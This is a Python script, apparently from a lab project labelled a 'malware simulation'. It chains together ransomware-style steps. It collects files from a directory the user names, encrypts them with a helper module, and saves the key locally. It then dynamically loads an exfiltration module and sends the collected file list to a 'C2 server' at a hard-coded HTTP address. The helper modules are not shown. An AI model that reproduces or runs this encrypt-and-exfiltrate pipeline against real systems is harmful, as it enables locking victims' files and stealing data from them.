import os
from test import collect_files           # File collection
from encryption import encrypt_files, save_key  # Encryption
import importlib.util
import sys

# Dynamic import for exfil script with spaces in the name
module_name = "exfil_script"
module_path = "exfil script.py"

# Load the module dynamically
spec = importlib.util.spec_from_file_location(module_name, module_path)
exfil = importlib.util.module_from_spec(spec)
sys.modules[module_name] = exfil
spec.loader.exec_module(exfil)

# Now you can use run_exfiltration as if it was imported normally
run_exfiltration = exfil.run_exfiltration

def main():
    target_dir = input("📁 Enter the directory to search: ").strip()
    
    # Step 1: File Collection
    print("[*] Collecting target files...")
    files = collect_files(target_dir)

    if not files:
        print("[-] No matching files found.")
        return

    with open("files.log", "w") as log:
        for file in files:
            log.write(file + "\n")

    # Step 2: Encrypt Files
    print("[*] Encrypting files...")
    key = encrypt_files(files)
    save_key(key, "key.bin")

    # Step 3: Exfiltrate log
    print("[*] Exfiltrating log file to C2 server...")
    run_exfiltration("files.log", "http://192.168.1.18:8080")

    print("[✓] Malware simulation completed successfully.")

if __name__ == "__main__":
    main()
